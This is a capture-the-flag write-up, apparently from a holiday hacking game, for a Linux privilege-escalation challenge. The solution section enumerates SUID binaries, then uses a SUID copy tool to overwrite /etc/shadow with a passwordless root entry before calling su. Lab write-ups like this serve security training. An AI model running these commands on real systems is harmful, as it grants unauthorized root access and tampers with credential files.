    What am I doing in this saloon? The better question is: what planet are you from?<br/>
    Yes, Iâ€™m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here.

## Hints

??? tip "Linux Privilege Escalation Techniques"
    There's various ways to escalate privileges on a Linux system.https://payatu.com/blog/a-guide-to-linux-privilege-escalation/

??? tip "Linux Command Injection"
    Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument..



## Solution

Upon obtaining console access to the terminal, we started exploring interesting files on filesystem

```sh
find / -perm -u+s 2>/dev/null
```

And we found binary **/usr/bin/simplecopy** . This binary can copy any file from the system even with root permission. So the plan was to take over root permissions.

Next we checked directory /etc/shadow for its structure. Create simple sh2 file with root account without password.

```sh
echo -e "root::19634:0:99999:7:::" > sh2
```

Next using simplecopy binary we modified /etc/shadow file and from now "su" did not require any password so we could freely use root account

```sh
 simplecopy sh2 /etc/shadow
 su

```
